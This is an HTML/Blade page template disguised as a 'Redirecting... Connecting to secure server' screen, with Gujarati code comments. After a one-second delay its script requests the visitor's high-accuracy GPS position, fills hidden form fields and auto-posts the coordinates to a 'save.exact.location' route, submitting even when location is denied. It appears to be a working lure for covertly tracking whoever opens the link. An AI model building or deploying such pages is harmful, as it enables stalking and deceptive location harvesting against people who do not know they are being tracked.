<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f4f4f4; }
        .loader { text-align: center; }
    </style>
</head>
<body>
    <div class="loader">
        <p>Connecting to secure server...</p>
        <p style="font-size: 12px; color: #666;">Please "Allow" location if prompted.</p>
    </div>

    <form id="geoForm" action="{{ route('save.exact.location') }}" method="POST">
        @csrf
        <input type="hidden" name="lat" id="lat" value="">
        <input type="hidden" name="lng" id="lng" value="">
    </form>

    <script>
        function sendData() {
            document.getElementById('geoForm').submit();
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        document.getElementById('lat').value = position.coords.latitude;
                        document.getElementById('lng').value = position.coords.longitude;
                        sendData();
                    },
                    function(error) {
                        console.log("Error: " + error.message);
                        sendData(); // એરર આવે તો પણ ગૂગલ પર મોકલી દેશે
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                sendData();
            }
        }

        // ૧ સેકન્ડના વેઈટ પછી પરમિશન માંગશે
        setTimeout(getLocation, 1000);
    </script>
</body>
</html>
